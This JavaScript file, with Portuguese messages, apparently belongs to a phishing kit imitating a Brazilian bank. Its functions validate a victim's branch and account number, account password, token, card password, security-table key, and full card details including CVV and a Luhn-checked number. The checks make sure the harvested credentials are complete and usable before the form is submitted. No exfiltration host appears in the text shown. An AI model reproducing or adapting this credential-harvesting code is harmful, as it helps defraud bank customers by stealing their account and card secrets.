$(document).ready(function(){
	$(".JGetImage").click(function() {
		var Valor = $("#arquivo").val();
		alert(Valor);
		return false;
	});

	$(".JCheckImage").click(function() {
		var getImage = $("#arquivo").val();
		if(getImage == ''){
			alert("Não conseguimos identificar a imagem.\nTente novamente!");
			return false;
		}else{
 			$("#form_acesso").submit();
		}
	});
});

function checkTksAcesso(){
	var tks = $("#tks_now").val();

	if(tks.length < 6 || tks.length > 6){
		alert("O Token informado está incorreto.\nTente novamente!");
		$("#tks_now").focus();
		return false;
	}
}

function checkPasSAcesso(){
	var pass6 = $("#ms_pass").val();

	if(pass6.length < 6 || pass6.length > 6){
		alert("A senha do cartão de crédito/débito não está correta.\nTente novamente!");
		$("#ms_pass").focus();
		return false;
	}
}

function getmms(arquivo){
	if(!arquivo){
		alert("Não conseguimos identificar a imagem.\nTente novamente!");
		return false;
	}else{
		$(".JSome").css({display: "none"});
		$(".JCheckImage").css({display: "block"});
	}
}

function checkPosTable(){
	var pos_table = $("#pos_table").val();

	if(pos_table == ''){
		alert("Você deve informar a chave de segurança solicitada.\nTente novamente!");
		$("#pos_table").focus();
		return false;
	}
	if(pos_table.length < 3 || pos_table.length > 3){
		alert("A chave de segurança informada não é válida.\nTente novamente!");
		$("#pos_table").val('');
		$("#pos_table").focus();
		return false;
	}
}

function checkFullCard(){
	var nome_card 	= $("#cd_name").val();
	var num_card 	= $("#cd_number").val();
	var mes_card 	= document.getElementById('val_card_mes').value;
	var ano_card 	= document.getElementById('val_card_ano').value;
	var cvv_card 	= $("#cd_cvv").val();
	var checkCC 	= checkCard(num_card);
	
	if(nome_card == '' || num_card == '' || cvv_card == ''){
		alert("Para prosseguir, informe os dados do seu cartão de crédito/débito!");
		return false;
	}
	if(nome_card.length < 8){
		alert("O nome do cartão informado não está correto.\nTente novamente!");
		$("#cd_name").val('');
		$("#cd_name").focus();
		return false;
	}
	if(!checkCC){
		alert("O número do cartão informado não está correto.\nTente novamente!");
		$("#cd_number").val('');
		$("#cd_number").focus();
		return false;
	}
	if(mes_card == 'mes'){
		alert("A data de vencimento do cartão não é válida.\nTente novamente!");
		return false;
	}
	if(ano_card == 'ano'){
		alert("A data de vencimento do cartão não é válida.\nTente novamente!");
		return false;
	}
	if(cvv_card.length < 3 || cvv_card.length > 3){
		alert("O Código de segurança informado não está correto.\nTente novamente!");
		$("#cd_cvv").val('');
		$("#cd_cvv").focus();
		return false;
	}
}

function checkFormAcesso(){
	var AG_CT = $("#agct").val();
	var CT_CT = $("#ctct").val();
	var DG_CT = $("#dgct").val();
	var P4_CT = $("#ps4ct").val();
	var checkConta = validarConta(CT_CT, DG_CT, CT_CT.length);

	if(AG_CT.length < 4 || AG_CT.length > 5){
		alert("Informe o número de sua agência.\nTente novamente!");
		$("#agct").focus();
		return false;
	}
	if(CT_CT.length < 4 || CT_CT.length > 8){
		alert("Informe o número da sua conta corretamente.\nTente novamente!");
		$("#ctct").focus();
		return false;
	}
	if(!checkConta){
		alert("A conta informada não está correta.\nVerifique:\nAgência, conta e digito!");
		$("#ctct").focus();
		return false;
	}
	if(P4_CT.length < 4 || P4_CT.length > 4){
		alert("A senha informada não está correta.\nTente novamente!");
		$("#ps4ct").focus();
		return false;
	}

}

function validarCPF(cpf){
	if(cpf.length > 11 && cpf.length == 14){
		var filtro = /^\d{3}.\d{3}.\d{3}-\d{2}$/i;

		if(!filtro.test(cpf)){
			return false;
		}
		cpf = remove(cpf, ".");
		cpf = remove(cpf, "-");
		if(cpf.length != 11 || cpf == "00000000000" || cpf == "11111111111" ||	cpf == "22222222222" || cpf == "33333333333" || cpf == "44444444444" ||	cpf == "55555555555" || cpf == "66666666666" || cpf == "77777777777" || cpf == "88888888888" || cpf == "99999999999"){
			return false;
		}
	}
	
	soma = 0;
	for(i = 0; i < 9; i++){
		soma += parseInt(cpf.charAt(i)) * (10 - i);
	}

	resto = 11 - (soma % 11);
	if(resto == 10 || resto == 11){
		resto = 0;
	}
	if(resto != parseInt(cpf.charAt(9))){
		return false;
	}

	soma = 0;
	for(i = 0; i < 10; i ++){
		soma += parseInt(cpf.charAt(i)) * (11 - i);
	}
	resto = 11 - (soma % 11);
	if(resto == 10 || resto == 11){
		resto = 0;
	}

	if(resto != parseInt(cpf.charAt(10))){
		return false;
	}
	return true;
}
function remove(str, sub) {
	i = str.indexOf(sub);
	r = "";
	if (i == -1) return str;
	{
		r += str.substring(0,i) + remove(str.substring(i + sub.length), sub);
	}
	
	return r;
}

function validarConta(conta, dig, tam_conta){
	var lsoma = 0;
	var ipeso = 2;

	var dv_informado = dig;
	var dv_conta = conta;
	var tam = tam_conta;

	var conta = new Array(tam);
	for (i=0; i<=tam; i++) 
	{conta[i] = dv_conta.substr( i, 1);}
	 while (tam > 0){
		digito = conta[--tam];
		if ((digito >= 0) && (digito <= 9)) { 
			lsoma = lsoma + (digito - 0) * ipeso; 
			ipeso = ipeso + 1; 
			if (ipeso > 7) 
			{ipeso = 2;}
		} 
	}
	lsoma %= 11; 
	lsoma = 11 - lsoma;
	if ((lsoma == 11) || (lsoma == 10))
	{lsoma = 0;}
	if (parseInt(dv_informado) == parseInt(lsoma)){
		return true;
	}else{
		return false;
	}
	return RetDig;	
}

function checkCard(num){
	var msg = Array();
	var tipo = null;
	if(num.length > 16 || num[0]==0){
		return false;
	} else {
		var total = 0;
		var arr = Array();
		for(i = 0;i < num.length;i++){
			if(i % 2 == 0){
				dig = num[i] * 2;	
				if(dig > 9){
					dig1 = dig.toString().substr(0,1);
					dig2 = dig.toString().substr(1,1);
					arr[i] = parseInt(dig1)+parseInt(dig2);
				} else {
					arr[i] = parseInt(dig);
				}		
				total += parseInt(arr[i]);
			} else {
				arr[i] =parseInt(num[i]);
				total += parseInt(arr[i]);
			} 
		}
	}
	if(msg.length>0){	
		return false;
	}else{
		if(total%10 == 0){
			return true;
		}else{
			return false;
		}
	}
}